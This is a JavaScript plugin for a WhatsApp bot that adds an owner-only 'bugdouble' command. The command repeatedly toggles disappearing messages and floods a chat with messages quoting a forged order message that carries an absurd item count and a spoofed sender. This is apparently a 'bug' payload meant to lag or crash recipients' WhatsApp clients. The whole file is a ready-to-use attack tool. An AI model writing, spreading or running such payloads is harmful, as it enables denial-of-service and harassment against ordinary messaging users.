let handler = async (m, { conn, args, text, isPrems, isOwner }) => {
if(!isOwner) return m.reply('OWNER BOT ONLY')
for (let i = 0; i < args[0]; i++) {
conn.toggleDisappearingMessages(m.chat)
conn.sendMessage(m.chat, `Salken Kak`, m.mtype,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 9999999999999,
status: 1,
surface: 10,
orderTitle: 'Hehe',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
}

handler.help = ['bugdouble <jumblah>']
handler.tags = ['owner']
handler.command = /^bugdouble/i
handler.owner = true
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false

handler.fail = null

module.exports = handler
